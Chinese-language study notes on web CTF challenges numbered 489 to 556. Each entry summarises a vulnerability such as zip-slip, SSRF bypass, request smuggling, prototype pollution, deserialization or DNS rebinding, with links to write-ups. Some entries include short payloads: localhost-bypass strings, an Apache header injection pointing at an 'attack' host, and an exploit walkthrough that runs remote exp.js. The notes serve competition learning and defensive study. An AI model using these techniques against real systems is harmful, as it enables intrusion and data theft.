489. [niceview1](https://github.com/Thehackerscrew/CrewCTF-2024-Public/tree/main/challenges/web/niceview1)
- 此题涉及到c++应用框架Juce和c++网站框架Drogon。第一次见c++网站
- 漏洞在于juce 6.1.4的zip symlink攻击。有了这个漏洞，攻击者就可以在juce解压zip文件时在服务器上写入任意文件
- Drogon危险配置项`load_dynamic_views`会自动加载`.csp`文件。[官方文档](https://github.com/drogonframework/drogon/wiki/ENG-06-View#dynamic-compilation-and-loading-of-views)建议仅在开发环境下使用该配置项，否则攻击者可以在服务器上写入Drogon的`.csp`文件从而执行任意代码
490. [funny-lfr](https://blog.neilhommes.xyz/docs/Writeups/2024/sekaictf.html)
- python [Starlette](https://www.starlette.io/) （网站框架）中出现的条件竞争。根据源码，这个框架内部用`os.stat`函数决定要下载的文件的大小，太大或者等于零都无成功下载文件。后一种情况导致我们无法读取`/proc/self`下的文件，因为整个`/proc`目录都在[procfs](https://en.wikipedia.org/wiki/Procfs)文件系统下，而这个系统又是一个不包含任何实际文件的虚拟文件系统。然而攻击者可以创建一个指向别的文件的symlink，然后让服务器下载这个symlink，同时中途将symlink指向的文件换成`/proc`下的文件
- 这个解法不是预期解，因为需要用ssh连到题目的环境。预期解则不需要： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#funny-lfr
491. [PetStore](../../CTF/moectf/2024/Web/PetStore.md)
- python pickle反序列化，要求在不出网的情况下拿到命令执行的结果。见flask内存马： https://www.cnblogs.com/gxngxngxn/p/18181936
492. [smbms](../../CTF/moectf/2024/Web/smbms.md)
- java的StringBuffer类也可能产生拼接相关的注入漏洞，如sql注入
493. [bucketwars](https://blog.hokyun.dev/posts/csaw-ctf-2024-quals-writeup)
- AWS S3 bucket malconfigured bucket policy信息泄漏
- 命令行解法： https://stefanin.com/posts/bucketwars-writeup
- bucket url特征：`s3.amazonaws.com`
494. [charlies angels](https://blog.hokyun.dev/posts/csaw-ctf-2024-quals-writeup),官方[wp](https://github.com/osirislab/CSAW-CTF-2024-Quals/tree/main/web/charlies-angels)
- js needle模块不会转义、过滤属性名称。因此若可以控制传入needle的内容，就能注入任意字段。控制某些特定字段可以将任意内容以任意文件的形式传到目标服务（似乎仅限http multipart格式）
495. [Loan App](https://abuctf.github.io/posts/IronCTF)
- HAProxy (High Availability Proxy)低版本请求走私漏洞： https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling 。此漏洞可使攻击者访问那些被deny的路径
- HAProxy会带个`haproxy.cfg`文件，里面的配置错误也会导致攻击者可以访问被deny的路径。补充一篇使用预期解的wp： https://0mr.me/ctf/ironctf24
496. [b64SiteViewer](https://0mr.me/ctf/ironctf24)
- 一些ssrf绕过手段(代替`127.0.0.1`)
```
127.1
2130706433
[0:0:0:0:0:ffff:127.0.0.1]
```
- 发现一个非预期解： https://medium.com/@pphreak313/ironctf-2024-writeup-782f41854341 。在url前面加个空格会导致python的urllib认为该url的scheme为空，此漏洞在`3.11.4`的urllib前都存在。见 https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4
497. [BotNet](https://gist.github.com/sebastianosrt/09d43c8de2f57105e76867b977455705)
- [ActivityPub](https://www.w3.org/TR/activitypub)协议使用。一篇相关介绍文章： https://dev.to/wadecodez/acknowledging-signing-fediverse-activity-requests-4do2
- 有现成的浏览器： https://browser.pub
498. [Puzzling](https://github.com/rehackxyz/REUN10N/tree/main/CTF-writeups/2024/SunshineCTF/web-puzzling)
- xxe，但是引用外部dtd文件（需要题目机器能访问外网）
499. [ComplainIO](https://stefanin.com/posts/heroctf_complainio)
- 3.5.5及以下版本的Carbone存在可以使原型链污染漏洞到rce的gadget。意味着Carbone本身不存在任何漏洞，但如果使用Carbone的程序里出现原型链污染，则攻击者可以利用Carbone里的代码实现rce。具体poc介绍见 https://archives.pass-the-salt.org/Pass%20the%20SALT/2024/slides/PTS2024-RUMP-02-Templating_Martin.pdf
- 注意直接使用poc里的payload可能会报错，这是因为poc里的payload仅考虑了只有Carbone的环境。如果程序还使用了其他第三方库，比如这题的Sequelize，污染原型链的操作也会影响到其他库，进而导致报错。看起来没啥好的解决办法，只能慢慢调试补救报错的地方
- 非预期解：**complainio** 。一条似乎更复杂的carbone利用链。[官方wp](https://github.com/HeroCTF/HeroCTF_v6/tree/main/Web/ComplainIO)也不错
500. [DNS](https://github.com/rehackxyz/REUN10N/tree/main/CTF-writeups/2024/BluehenCTF/web-DNS)
- ECS (EDNS Client Subnet)参数绕过ip检测。类似于http的X-Forwarded-For，只不过ECS用在dns服务器
- 也有网页GUI版dig： https://www.diggui.com 和 http://digwebinterface.com 。有时本机的dig命令可能被防火墙挡住
- 另一种绕过方式： https://themreviil-blog.github.io/post/bluehens2024/bluehens-ctf-writeup
501. [Firefun 3](https://github.com/rerrorctf/writeups/blob/main/2024_11_10_BlueHens24/web/firefun_3)
- firebase网站信息泄漏。访问`/_/firebase/init.json`路径能看见其配置文件。如果权限也配置错误的话，攻击者可以自行增加firebase用户并修改用户权限
- 一些相关工具
    - [Baserunner](https://github.com/iosiro/baserunner)
    - [firepwn](https://github.com/0xbigshaq/firepwn-tool)
502. [Greetings](https://blog.jaquiez.dev/Blogs/1337UP2024)
- php fopen函数相关ssrf。题目设置如下：
```php
fopen("$protocol://127.0.0.1:3000/$name", 'r', false, $context)
```
其中`$protocol`,`$name`和`$context`都由用户控制。利用`php://filter`可以访问内部服务器路径，但无法传递参数。传递参数可以利用`ftp://`协议（但ssrf目标可能仅限werkzeug，比如flask网站。原因见下一条）加上`$name`处的CRLF injection实现请求走私
- werkzeug只看路径。假设有一个`GET ftp://127.0.0.1:3000/flag`的http请求，werkzeug判断实际访问路径的方法是用`urllib.parse.urlsplit`解析出路径。此处为`/flag`
503. [Global Backups](https://github.com/JorianWoltjer/challenges/blob/main/1337up-live-2024/global-backups)
- express session爆破。其实爆破的是sessino末尾的签名，所以等同于爆破HMAC-SHA256
- [session-file-store](https://github.com/valery-barysok/session-file-store)用于将session内容存储到文件里。但这个库内部使用`path.join`连接固定path的session id。假如可以伪造session id且可以往服务器上传文件，则可以伪造任何session数据
- 在`1.1.8`及以前的版本，[bun shell](https://bun.sh/docs/runtime/shell)存在通配符注入。假如可以检测命令执行是否成功的话，可以用来泄漏目录/文件名
- scp命令参数注入。和ssh的参数注入利用差不多，见 https://sonarsource.github.io/argument-injection-vectors
- 利用通配符执行命令。一个小技巧，可以将要执行的命令（或参数）以文件名的形式写在当前目录，这样就能用通配符匹配出完整的命令了。可用于绕过滤
504. [GlacierChat](https://themreviil-blog.github.io/post/glacierctf2024)
- 用了`$db->prepare`都还有sql注入……prepare的sql语句里诸如`?`,`:xx`才是可以被正确bind的内容，直接用`$xx`还是普通的语句拼接
- OTPHP使用。php里用来生成一次性密码的库。安全性依赖于totp_secret。如果攻击者得知这个字段的值，就能破解接下来生成的所有otp（取决于otp的类型，Time-based otp还需要拿到服务器上的时间戳）
505. [Fuzzybytes](https://sibivasan.gitbook.io/sibivasan/writeups/2024/glacier-ctf-2024)
- [zipslip](https://github.com/snyk/zip-slip-vulnerability)（tarslip）漏洞。攻击者构造带有`../`的恶意文件名，tar命令解压时会将该文件写到解压目录外的地方去。路径穿越的锅
506. [Cash Puzzle](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#cash-puzzle)
- 这题有两个由go写的后端，分别在机器A和B上。两者共用A上的httpd反向代理。唯一的漏洞是文件读取，但出现这个漏洞的机器A上没有flag，flag在B里。关键是利用httpd反向代理的缓存机制，通过代理访问B的flag后缓存文件留在了A里，这时就能利用文件读取漏洞拿flag了
- 一个干扰项是每一个请求都有`Cache-Control: no-cache` header。这个header并不代表不会缓存网页，而是缓存后的每一次请求都要检查缓存是否是最新内容。还有一个难点在于缓存文件的路径由某种哈希算法生成，不好找。最简单的解决办法是自己跑一次docker，手动确认缓存文件的路径
507. [Pretty HTML Page](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#pretty-html-page)
- php mb_strpos和mb_substr的解析差异
508. [Guessy CTF Solver](https://github.com/WorldWideFlags/World-Wide-CTF-2024/tree/main/Web%20Exploitation/Guessy%20CTF%20Solver)
- happy-dom的[rce漏洞](https://github.com/capricorn86/happy-dom/issues/1585)
509. [Tammy's Tantrums](https://github.com/Cryptonite-MIT/niteCTF-2024/tree/main/webex/tammys_tantrums)
- mongoose findOne where语句布尔注入。自己做出来了，不过需要更正一下之前的错误认知。之前以为必须要找到正确的id才能用`this.xxx`去泄漏对应id的对象的xxx属性的值。事实上id给个空值就行，只要条件用`||`来判断就能取到数据库里的全部对象了（被this给误导了，以为必须先用id选出一个对象才能用this去代表那个对象……）
- 自己的单线程垃圾脚本： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#tammys-tantrums
510. [Manifesto](https://blog.regularofvanilla.com/posts/0xl4ugh)
- 寻找[Clojure](https://clojure.org)搭建的网站的漏洞（题外话，这个语言的语法好奇怪，和我之前见过的完全不一样……）
- mass assignment漏洞。题目直接将请求参数merge进session，于是攻击者可以随意设置session里的字段和值
- clojure的read-string函数存在代码执行(`https://clojuredocs.org/clojure.core/*read-eval*`)。其他payload： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#manifesto 。这玩意因为[Java Interop](https://clojure.org/reference/java_interop)受限较大，只能用构造函数（constructors），比如`#java.net.Socket[]`。加上read-eval的`#=`语法，又只能用静态方法。于是想拿完整RCE还是很困难的
511. [Ada Indonesia Coy](https://blog.regularofvanilla.com/posts/0xl4ugh)
- 好像每半年就会遇见一道electron原型链污染rce……这次再补充点知识
    - electron安全相关的设置有三个，contextIsolation（`preload.js`与webContents的环境是否不同），nodeIntegration(webContents环境是否可以访问Node.js的api)和sandbox(限制权限，是否能够运行shell script)。nodeIntegration是true或者sandbox是false才有可能拿rce
    - rce部分主要是hook [webpack](https://webpack.js.org)的`__webpack_require__`函数，使其在加载某个模块时运行攻击者的恶意代码（`Object.defineProperty`设置setter，借机保存module模块）。更详细的内容见 https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf
- `Element.setHTML`属于Sanitizer api。虽然在大部分地方已经被弃用了，然而在electron里还能用。不过过滤的也不完全，可以用`<meta>`标签重定向
- setInterval可以用字符串作为第一参数。所以可以留意那些`setInterval(xx.xx)`的地方，如果有dom clobbering就能执行自己的js代码
- 更详细的wp： https://nolangilardi.github.io/blog/2024-0xl4ugh-ctf--ada-indonesia-coy
512. [political](https://tsuruyu.gitbook.io/tsuryus-ctf-writeups/irisctf-2025/web/political-easy)
- “绕过”chrome `policy.json`内容。关键还是经典的url编码混淆(构造类似`//xxx`的url也可以)，而url在检查前未经normalized
- 这样也行啊？ https://github.com/negasora/Some-CTF-Solutions/blob/master/irisctf-2025/web/political
513. [webwebhookhook](https://jorianwoltjer.com/blog/p/ctf/irisctf-2025-webwebhookhook)
- dns rebinding攻击。kotlin基于java，而java在执行URL类的比较时会调用dns解析，检查两个url解析到的ip是否相同。相同的话则判定两个url相同，与url的字面值无关。所以有可能出现dns rebinding攻击：程序检查两个url是否相同后再建立连接，这中间有条件竞争的窗口。攻击者可以搭建自己的dns服务器不断更换解析的ip，能绕过url检查而建立http连接后却导向攻击者的服务器。虽然java为了防止这类攻击会把dns结果记忆30秒，然而攻击者仍然可以卡30秒过期之前的时间
- 其他资源：
    - https://zimzi.substack.com/p/irisctf-2025-webwebhookhook
    - https://ireland.re/posts/irisctf_2025
    - 在线dns rebinding攻击工具： https://lock.cmpxchg8b.com/rebinder.html
    - [官方wp](https://github.com/Seraphin-/ctf/blob/master/2025/irisctf/webwebhookhook.md)和DNS rebinding attack框架[singularity](https://github.com/nccgroup/singularity)
514. [CodeDB](https://yun.ng/c/ctf/2025-uoft-ctf/web/code-db)
- 看了半天都没找到代码的逻辑错误在哪，结果是个正则时间注入（自己编的怪名字）。早有耳闻regex在条件竞争里的延长竞争窗口用法，今天总算遇见了其最直接的利用方法。题目允许输入任意regex匹配含有flag的内容，可以通过regex匹配时间的长短判断当前猜测的flag前缀是否正确
- 感觉[这样构造](https://github.com/RickdeJager/CTF/blob/master/JUSTCAT2020/web/computeration/writeup.md#the-vulnerability)的regex payload更好，爆破的耗时更少
515. [Prismatic Blogs](https://nullbrunk.github.io/posts/UofTCTF2025-prismatic-copy)
- [prisma orm](https://www.prisma.io/docs/orm)注入。比赛时又脑抽，不知道怎么通过get请求传object；事实上因为题目用的是`req.query`取参数，直接`?key[a][b]=value`即可
- 之前见过注入mutation请求的题目。这道是where语句注入，目标是泄漏数据库的内容
- 这题的考点 https://www.elttam.com/blog/plorming-your-primsa-orm 里有，还介绍了基于时间（时间盲注？）的orm注入payload
516. [Timeless](https://blog.regularofvanilla.com/posts/UotT)
- 如果服务器设置了`random.seed`，就能用以下三个数据就能计算任意时刻生成的`uuid.uuid1`值：
    - 服务器的mac地址
    - uuid创建的时间（纳秒级）
    - seed值（uuid1的生成调用了`random.getrandbits`，本来是不可预测的。如果服务器提前seed后就可以了）
- [flask-session](https://github.com/pallets-eco/flask-session)若使用了[filesystem](https://flask-session.readthedocs.io/en/latest/api.html#flask_session.filesystem.FileSystemSessionInterface)模式，则session内容会以pickle的形式存储在服务器的文件系统中，位于`md5("session:"+sessionId)`（具体路径得看[源码](https://github.com/pallets-eco/cachelib/blob/main/src/cachelib/file.py#L210),取决于cache_dir的值）。因此如果有文件上传能力且能控制文件名和session使用的sessionId，就能利用pickle实现rce
517. [1337 v4ul7](https://github.com/UofTCTF/uoftctf-2025-chals-public/blob/master/leet-vault)
- 提取签名jwt的公钥（和之前见过的i am confusion类似）的工具：[JWT-Key-Recovery](https://github.com/FlorianPicca/JWT-Key-Recovery)
- 其他wp：**1337 v4ul7**
518. [Sparkling Sky](https://github.com/srdnlen/srdnlenctf-2025_public/blob/main/web_sparklingsky)
- 大名鼎鼎的log4j漏洞利用
- 其他wp： https://r3kapig-not1on.notion.site/Srdnlen-CTF-2025-Writeup-by-r4kapig-181ec1515fb98004b3e2c42e74ce5fc5
519. [Average HTTP/3 Enjoyer](https://github.com/srdnlen/srdnlenctf-2025_public/blob/main/web_averageHTTP3enjoyer)
- 什么http都有3了？明明2都没怎么用过（
- 题目的Haproxy和ACL规则禁止访问`/flag`。然而http 3有伪头部字段（pseudo-header，2也有），如`:path`，可以直接传要访问的路径。单独传一个flag也能正常访问`/flag`路径。唯一的问题是大部分工具都会在路径前自动加个`/`。能通过改工具源码避免这点： https://github.com/aiortc/aioquic/blob/main/examples/http3_client.py#L227
520. [Baby Injection](https://seall.dev/posts/knightctf2025)
- PyYAML（python yaml处理库）反序列化漏洞。常见payload： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md#pyyaml
521. [Luana](https://seall.dev/posts/knightctf2025)
- redis LUA Sandbox Escape： https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html
522. [submission](https://blog.whale-tw.com/2025/01/27/x3ctf-2025)
- wildcard injection。拿`*`举例，这个符号会扩展成当前目录下的任意文件名（除了`.`开头的文件）。假如执行`find *`而且有个文件名为`--arg`，实际效果等于执行了`find --arg`
- chmod有个`--reference=file`选项，可以把文件改成和file一样的权限
- 在命令后加个`--`即可避免这个问题，比如`chmod -- 0 *`
- 这个行为似乎在macOS上无法复现。拿到和题目一样的环境真的太重要了……
523. [kittyconvert](https://github.com/x3ctf/challenges-2025/blob/main/web/kittyconvert)
- 在png文件里编写php木马。难点在于上传的png文件会被转成`.ico`再存储，所以需要找到在这个转换过程中不变的字节
- 在png转ico的过程中，png的RGBA顺序对应着ico的BGRA。唯一的问题是ico的alpha值的lsb会被丢弃，所以必须满足`ord(c) % 2 == 0`
- 补充个有互动的wp： https://exe2py.neocities.org/writeups/2025_x3ctf/kittyconvert
524. [MVMCheckers Inc](https://oshawk.uk/Writeups/MVMCheckers+Inc)
- 文件polyglot，使file命令返回的结果里包含`image`，同时是个json文件。前者可以用`xbm image`（其他的也可以，不过这个类型的文件头规定没那么严格）绕过，但file命令判断文件为json的优先级更高。预期解里程序在调用file后会把`\`替换为空，所以可以用`\`破坏json结构也不影响使用。更普遍的做法是多加几层`[]`，超过500层后file就不会将其看作是json了
- 各种mime类型见 https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime
525. [Story Creator](https://github.com/x3ctf/challenges-2025/blob/main/web/StoryCreator/challenge-solution)
- 后端Go+gqlgen，前端Vite, React和Apollo GraphQL，并用Automated Persistent Queries（APQ）缩减GraphQL请求的大小。APQ机制我粗略看了一下，核心思想是把查询语句存储在服务器端，这样客户端只需要发送一个hash，由服务器端用判断该hash对应哪个查询语句。若hash不存在，则让客户端需重新发送完整的查询语句，存储后再执行
- gqlgen在遇见hash和查询语句被同时发送的情况下会直接设置cache key，无论发送过来的hash cache key是否已经被设置过
- 这题的漏洞为Automated Persistent Queries cache poisoning。题目有个headless browser bot固定查询一个hash值为h的语句，但flag不在任何一个已存在的查询语句内。题目使cache查询语句的hash容易出现碰撞，于是攻击者尝试构造包含flag的查询语句，同时其hash值等于h。配合上一条gqlgen的特性，能够把h对应的语句换成带有flag的语句。于是等bot查询的时候就能得到flag了
526. [ZONEy.eno](https://blog.n0va.in/posts/nullcon-writeup)
- dns & dig相关挑战
- NSEC-walking。对某个已知的域名请求NSEC记录会返回下一个有效域名，于是攻击者可以重复这一步骤进而暴露DNS区域中的所有域名信息，包括内部系统或未公开的服务
527. [SpELling it out](https://github.com/delta/PCTF25-Writeups/blob/main/web/SpELling-it-out)
- java Spring expression language injection。代码使用了`?#{?0}`，即会把第一个参数当作SpEL表达式执行；加上程序没有任何过滤，故出现rce
528. [Whack a Mole](https://sylvie.fyi/posts/lactf-2025)
- python flask内部处理session的dump_payload会用`zlib.compress`压缩原本的session。如果flag出现在session里，可能可以利用这点进行测信道
529. [Old Site](https://sylvie.fyi/posts/lactf-2025)
- 当nextjs以开发模式启动时（`next dev`），网站将自动包含默认路由`/__nextjs_source-map`。这个路由接收一个`?filename`参数，作用是指定source map文件。如果source map文件包含一句`//# sourceMappingURL=filepath`且filepath指向的文件是合法json，则会展示该文件的内容
530. [whats-my-number](https://github.com/uclaacm/lactf-archive/blob/main/2025/web/whats-my-number)
- 破解js math.random。相关资源：
    - https://github.com/Arc-blroth/ece117-unpredictables
    - https://www.youtube.com/watch?v=_Iv6fBrcbAM
    - https://github.com/XMPPwocky/nodebeefcl
531. [zStego](https://learn-cyber.net/writeup/zStego)
- doc文件（zip）解压与symlink。这题补了我一个盲点，symlink还可以link到目录。比如让media为链接到根目录的symlink，php改变目录到`word/media`目录实际上是改变到了根目录。可以用来绕`ini_set('open_basedir', '.')`（万物皆是文件的魅力时刻）
    - 补充一点，这个做法只有php > 8.3才能使用。旧版本没有这么智能，认为路径就应该在`.`下（即使`.`就是root），因此读不到`/flag`
532. [PwnShop](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/Pwnshop)
- 无回显的xxe，即无法获取xxe请求的返回内容。可以用Out Of Band (OOB)请求绕过（看起来只是使服务器下载了公网上布置的恶意dtd文件而已）
- [Less.php](https://github.com/wikimedia/less.php) 0 day rce漏洞
533. [G0tchaberg](https://mariosk1574.com/posts/kalmar-ctf-2025-g0tchaberg)
- 此题的设置是脚本每五秒就会访问gotenberg `/forms/chromium/convert/html`来渲染flag；但文件在远程机器上，攻击者无法直接访问
- [Gotenberg](https://github.com/gotenberg/gotenberg)是一个将html，markdown等其他格式的文件转为pdf的api工具
    - 允许列出`/tmp`目录下的文件名以及文件读取，可以用html的iframe标签加`file://` url实现
    - 采用队列的形式处理请求。在`/tmp`下的一个随机uuid名称的目录里，gotenberg会为每个请求创建随机的uuid目录，并将等待转换的原始文件存入其中。pdf转换完成后会删除目录以及内部的文件。同时只会处理一个请求，但请求时设置`waitDelay`可以实现异步的操作
- 复述一下exp过程
    1. 首先使用iframe列出`/tmp`下的目录，确认随机的uuid名称（称为uuid1）
    2. 用第二个请求列出`/tmp/uuid1`下的内容，注意设置`waitDelay`
    3. 紧接着发送第三个请求，内容是fetch远程服务器的exp.js并执行。同样需要设置`waitDelay`
    4. 理想情况下，接下来正好是题目自动发送的渲染flag的请求
    5. 第四步的请求使`/tmp/uuid1`下出现了含有flag的目录。`waitDelay`后第二步的请求将能列出flag所在的目录，称为`uuid2`
    6. 拿到uuid2后迅速往第三步提到的远程服务器上传`exp.js`，内容为读取`/tmp/uuid1/uuid2/`下的已知名称的flag
    7. 第三个请求的`waitDelay`结束后执行`exp.js`，成功读取到flag
- 另一个不错的wp： https://siunam321.github.io/ctf/KalmarCTF-2025/web/G0tchaberg
534. [KalmarDSL](https://siunam321.github.io/ctf/KalmarCTF-2025/web/KalmarDSL)
- [Structurizr](https://structurizr.com) 3.1.0 RCE漏洞
535. [NoSQLi](https://worty.fr/post/writeups/kalmarctf2025)
- rust mongodb 2.8.1协议层面的sql注入。说是sql注入，其实更像请求走私
- 简述一下漏洞成因。rust的mongodb库处理收到的packet长度时将u32的整数值转成了i32，导致出现整数溢出。因此服务器认为当前收到的packet长度为0，便将后续收到的数据当作下一个packet处理。后续的数据里包含用户控制的查询的内容，于是攻击者可以借此构造恶意packet，往数据库里插入数据（估计只要格式对了，干啥都行）
536. [Red wEDDIng](https://github.com/kalmarunionenctf/kalmarctf/tree/main/2025/web/red-wedding)
- [EDDI](https://github.com/labsai/EDDI) 5.5.0前存在zip路径穿越漏洞（zipslip），可以实现任意文件写（覆盖）。利用这个漏洞可以覆盖服务运行时需要的jar文件，从而实现rce
- 有人给创建恶意jar包写了个工具：[JAR Poisoner](https://github.com/pspaul/jar-poisoner)
537. [Cyber Attack](https://100gryphons.wordpress.com/htb-cyber-apocalypse-2025)
- apache response header注入。如果攻击者可以控制apache服务的response header，就能注入类似如下的内容：
```
Location:/x
Content-Type:proxy:http://attack/
```
效果是操控机器访问`http://attack/x`。详情见[Confusion Attacks(ssrf)](https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf)
- ipv6能够在`%`后夹杂其他内容（但不能带`/`），仍然会被判定为有效ip
538. [Eldoria Realms](https://medium.com/@dassomnath/eldoria-realms-hackthebox-cyber-apocalypse-2025-ecde31783ec9)
- go+ruby搭建的网站，漏洞点是ruby的class pollution： https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html 。类似js的原型链污染，特征都是递归的merge函数。效果是修改当前实例甚至是父类的属性值等内容
- gopher协议的url格式如下：`gopher://<host>:<port>/<gopher-path>`。其中`<gopher-path>`可以由`<gophertype><selector>`组成。`<gophertype>`仅占一个字符，而剩下的`<selector>`会原封不动地用tcp协议传输至服务器。因此gopher协议的行为完全由服务器端定义
    - 这题用的是[go-gRPC](https://grpc.io/docs/languages/go/basics)，允许客户端像调用本地对象一样调用远程机器上的方法。可以用`gRPCurl`与服务器交互并观察信息是如何传输的
    - gRPC内部用http/2传输内容
- 利用class pollution可以修改服务器用curl请求的url。将这个url改为gopher后，便能利用`<selector>`部分“走私”对gRPC服务器的请求
- 另一篇比较简短的wp： https://hackmd.io/@carrot303/SyIPww-Tyg
539. [pyramid](https://hxuu.github.io/blog/ctf/dice25/pyramid)
- nodejs http event和express路由的行为区别。参考下面这段代码：
```js
app.post('/', (req, res) => {
    req.on('end', () => {
        //一些有关token的代码
    })
    res.header('set-cookie', `token=x`)
})
```
`app.post`部分是express的路由；路由里的`req.on`是nodejs的事件。end事件只有在http请求的body完全传输完毕后才会调用；而路由里的内容在http请求头传输后就会调用（即使请求还没有传输完body）。因此在这个情况下，能在end处理token之前拿到token
540. [old-site-b-side](https://adragos.ro/dice-ctf-2025-quals)
- `next.js`特性：访问`/_next/image`时使用的是访问者的cookie，但缓存的结果对所有用户开放（持续60秒，且攻击者需要用与目标相同的Accept标头，见[官方wp](https://bulr.boo/writeups/2025/dicectf/quals)）
541. [dicepass](https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups)
- chrome插件的相关知识
 - background.js是后台常驻运行的脚本
 - content.js是注入到网页中的脚本，运行在网页的上下文中。通过`chrome.runtime.sendMessage`与background.js通信。受沙盒限制，被注入的网页无法直接访问插件里的全局变量。但这题是例外， https://github.com/dicegang/dicectf-quals-2025-challenges/blob/main/web/dicepass/chall/extension/src/content.js#L112 使用comlink将变量和函数暴露出来。网页可以用`dicepass.xxx`访问
- 题目的关键是下面这段：
```js
const usernameInput = document.querySelector('[data-dicepass-username]');
const passwordInput = document.querySelector('[data-dicepass-password]');
//...
if (await remote.hasPasswordFor(id)) {
    const { username, password } = await remote.getLogin(id);
    context.prevUsername = usernameInput.value;
    context.prevPassword = passwordInput.value;
    usernameInput.value = username;
    passwordInput.value = password;
    return;
}
```
如果利用dom clobbering使`usernameInput.value`为一个dom元素，就能用`prevUsername.ownerDocument.defaultView`获取该元素所属的document的window对象。而这个window中有chrome对象，得以访问chrome相关的api
- content.js中存在csp，但仍然可以用`setTimeout(string)`执行任意函数： https://issues.chromium.org/issues/330693450
- 其他解法：**dicepass**
542. [Research](https://github.com/tamuctf/tamuctf-2025/tree/main/web/research)
- `pdflatex`的内置命令使用
- 其他wp：**Research**
543. [Peek a QL](https://baradika.netlify.app/p/breach-ctf)
- graphql注入泄漏信息
- **Peek a QL**
544. [Framework Follies](https://github.com/CSeCIITB/BreachCTF/tree/main/web/framework-follies)
- `Next.js`中，函数调用依赖action id。如果一个函数被编译进next.js自动生成的网站却没有被调用，攻击者仍然可以通过获取其函数id手动调用
- **Framework Follies**
545. [Do Not Cheat](https://1kuzus.github.io/25b/wp-1753ctf-2025)
- pdf.js库[CVE-2024-4367](https://github.com/LOURC0D3/CVE-2024-4367-PoC)，任意js代码执行。比赛时找到了cve，但是ngrok的转发需要用户交互；后续找到了 https://serveo.net (现在已经无法用了)，但flask忘记设置正确的header了，导致cors错误……
546. [trouble at the spa](https://mushroom.cat/ctf/react-router-b01lersctf25)
- single page application。这类应用通过重写当前页面（包括url，但不会向服务器发送对该url的请求）而不是加载新页面来实现用户交互。github网页可能无法正确处理此类网站的逻辑（向不存在的网页发送请求，导致404）。解决办法是自行在console输入`window.history.pushState`手动触发本地的页面变换功能。关键在于变换url时不刷新当前页面
547. [musicplayer](https://ctf.gg/blog/b01lersctf-2025/musicplayer)
- python [shutil.unpack_archive](https://docs.python.org/3.11/library/shutil.html#shutil.unpack_archive)存在zipslip，即攻击者可以构造恶意文件名，在函数指定的解压路径外写文件
- autoreload的利用：给攻击者提供了任意文件写攻击的目标。比如，攻击者可以劫持当前用户家目录下的python site-packages，导致应用autoreload时加载恶意第三方库： https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/#code-execution-via-sitespecific-configuration-hooks
- 官方wp和其他可能的解法： https://github.com/SuperStormer/writeups/tree/master/b01lers_ctf_2025/web/musicplayer
548. [njaas](https://simonedimaria.xyz/posts/b01lers-ctf-2025/njaas)
- [CVE-2025-29927](https://github.com/advisories/GHSA-f82v-jwr5-mffw)：设置`x-middleware-subrequest` header可以绕过next.js的middleware。即使在这个CVE被patch了的版本，如果攻击者能够控制应用的环境变量`NEXT_PRIVATE_TEST_HEADERS`（控制这个key就可以，值无所谓），依然可以利用漏洞
549. [no-code](https://ctf.gg/blog/b01lersctf-2025/no-code)
- js原型链污染
- 在对象内定义一个length属性就能让js的`Array.from`将其识别为数组
550. [atombomb](https://github.com/b01lers/b01lers-ctf-2025-public/tree/main/src/web/atombomb)
- elixir搭建的网站若不过滤参数，攻击者可以直接传入一个对象
- **Atom Bomb**
551. [Willy Wonka Web](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/wonka)
- Apache 2.4.55 CVE-2023-25690请求走私： https://github.com/dhmosfunk/CVE-2023-25690-POC
- **Willy Wonka**
552. [When?](https://github.com/tankist0x01/no-hack-no-ctf)
- php fast-cgi（PHP-FPM）代码执行（错误配置`auto_prepend_file = php://input`和`allow_url_include = On`）
553. [Catch The Goose](https://blog.frankk.uk/posts/nhnc-2025)
- 如何用grpc协议进行交互
- 另一篇wp： https://humdrum-beanie-d4b.notion.site/Web-catch-the-goose-2290c5a009e3803dae85cc21fb62e126
554. [sodium](https://siunam321.github.io/ctf/DownUnderCTF-2025/web/sodium)
- [pound](https://github.com/graygnuorg/pound)在转发请求时会自动加上一些`X-Forwarded`请求头，如`X-Forwarded-For`。如果用户发送请求时已经添加了一个`X-Forwarded-For`，则服务器端得到的字段内容为用户提供的值用逗号拼接上检测到的ip。但如果用户发送了两个`X-Forwarded-For`，此时服务器端就只能得到用户给的最后一个`X-Forwarded-For`的值
- [Funky chunks: abusing ambiguous chunk line terminators for request smuggling](https://w4ke.info/2025/06/18/funky-chunks.html):proxy和服务器对HTTP/1.1 Chunk Extensions语法的解析差异导致的请求走私
555. [mini-me](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mini_me)
- 从source map文件恢复js源码：[Sourcemapper](https://github.com/denandz/sourcemapper)
556. [off_dah_rails_m8](https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/off_dah_rails_m8)
- go语言的`net/url`模块默认检查url中未转义的控制字符（如`\n`），但`#`后的部分除外
- redis blind ssrf
- ruby中不安全的反射（unsafe relection）配合第三方库的gadget可以实现rce： https://www.elttam.com/blog/rails-sqlite-gadget-rce （ruby on rails/rack）
    - 这题反射漏洞出现在`config_hash["type"].constantize.new(config_hash["arg"])`，gadget为`Mysql2::Client`，可用于连接任何远程/本地的mysql/mariadb数据库
